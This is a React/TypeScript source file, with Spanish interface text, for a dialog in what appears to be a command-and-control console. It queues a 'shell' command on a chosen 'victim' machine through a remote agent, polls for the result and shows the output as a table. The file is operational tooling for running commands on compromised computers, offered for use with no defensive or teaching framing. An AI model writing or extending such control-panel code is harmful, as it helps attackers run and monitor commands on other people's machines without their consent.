'use client';
import { useCallback, useEffect, useState } from 'react';
import { Copy, RefreshCw } from 'lucide-react';
import { Dialog, DialogContent, DialogDescription, DialogTitle } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { mutate } from '@/hooks/useApi';
import { ApiError } from '@/lib/api';
import type { ActionDef } from '@/lib/actions';
import type { Task, Victim } from '@/lib/types';
import { toast } from 'sonner';

function explain(error: unknown): string {
  if (error instanceof ApiError) {
    if (error.code === 'agent_offline') return 'Sin socket de control. Reintenta cuando el equipo vuelva.';
    if (error.code === 'busy') return 'Agente ocupado (4 tareas). Cancela una y reintenta.';
    if (error.status === 429) return 'Límite 429; reintenta en unos segundos.';
    return error.message;
  }
  return error instanceof Error ? error.message : 'Error de red';
}

/** Vista de solo lectura sobre `shell`: encola, espera el resultado y lo pinta como tabla. */
export function ShellViewDialog({ action, victim, onClose }: { action: ActionDef | null; victim: Victim; onClose: () => void }) {
  const [state, setState] = useState<{ loading: boolean; error: string | null; output: string; taskId: string | null; status: string }>({ loading: false, error: null, output: '', taskId: null, status: 'idle' });

  const load = useCallback(async () => {
    if (!action?.view) return;
    setState({ loading: true, error: null, output: '', taskId: null, status: 'queued' });
    try {
      const created = await mutate<{ items: Task[] }>('/tasks', 'POST', {
        victim_ids: [victim.id], name: 'shell', params: { command: action.view.command(victim) }, timeout_sec: 90
      });
      const id = created.items[0]!.id;
      setState((current) => ({ ...current, taskId: id, status: 'running' }));
      for (let attempt = 0; attempt < 25; attempt += 1) {
        await new Promise((resolve) => setTimeout(resolve, 700));
        const response = await fetch(`/api/console/tasks?victim=${victim.id}&name=shell&limit=1`).then((res) => res.json()) as { items: Task[] };
        const task = response.items.find((item) => item.id === id);
        if (task && ['done', 'error', 'unknown', 'expired', 'cancelled'].includes(task.status)) {
          if (task.status === 'done') setState({ loading: false, error: null, output: String((task.result as { output?: string } | null)?.output ?? ''), taskId: id, status: task.status });
          else setState({ loading: false, error: task.error ?? task.status, output: '', taskId: id, status: task.status });
          return;
        }
      }
      setState({ loading: false, error: 'sin respuesta en 17 s; la tarea sigue en el log', output: '', taskId: id, status: 'running' });
    } catch (error) {
      setState({ loading: false, error: explain(error), output: '', taskId: null, status: 'error' });
    }
  }, [action, victim]);

  useEffect(() => { void load(); }, [load]);

  const lines = state.output.split('\n').filter((line) => line.trim().length > 0).slice(0, 800);
  const rows = lines.map((line) => line.trim().split(/\s{2,}|\t/).slice(0, 8));
  const width = Math.max(1, ...rows.map((row) => row.length));

  return (
    <Dialog open={Boolean(action)} onOpenChange={(open) => { if (!open) onClose(); }}>
      <DialogContent className="w-[min(96vw,940px)]">
        <DialogTitle className="flex items-center gap-2">{action?.view?.title} <Badge tone="brand">shell</Badge></DialogTitle>
        <DialogDescription>{victim.hostname} · {victim.os} · lectura, sin escritura en el equipo.</DialogDescription>
        <div className="mt-2 flex items-center gap-2">
          <Button size="sm" variant="secondary" onClick={load} loading={state.loading}><RefreshCw className="h-3 w-3" /> recargar</Button>
          {state.output ? <Button size="sm" variant="ghost" onClick={() => { void navigator.clipboard?.writeText(state.output); toast.success('Salida copiada'); }}><Copy className="h-3 w-3" /> copiar</Button> : null}
          {state.taskId ? <span className="font-mono text-2xs text-muted">tarea {state.taskId.slice(0, 8)} · {state.status}</span> : null}
        </div>
        {state.error ? <p className="mt-2 rounded border border-bad/30 bg-bad/10 p-2 text-2xs text-bad">{state.error}</p> : null}
        <div className="mt-2 max-h-[56vh] overflow-auto rounded border border-line bg-black/30">
          {state.loading && lines.length === 0 ? <p className="p-4 text-xs text-muted">Ejecutando shell y esperando salida…</p> : null}
          {!state.loading && !state.error && lines.length === 0 ? <p className="p-4 text-xs text-muted">La tarea terminó sin salida.</p> : null}
          {rows.length > 0 ? (
            <table className="w-full border-collapse font-mono text-2xs">
              <tbody>
                {rows.map((row, index) => (
                  <tr key={index} className={index === 0 ? 'bg-panel text-muted' : 'border-t border-line/40 hover:bg-line/20'}>
                    {row.map((cell, column) => <td key={column} className="max-w-[320px] truncate whitespace-nowrap px-2 py-0.5">{cell}</td>)}
                    {Array.from({ length: width - row.length }).map((_, column) => <td key={`empty-${column}`} />)}
                  </tr>
                ))}
              </tbody>
            </table>
          ) : null}
        </div>
        <p className="mt-1 text-2xs text-muted">Hasta 800 líneas; la salida completa queda en el artefacto de la tarea si supera el límite inline.</p>
      </DialogContent>
    </Dialog>
  );
}
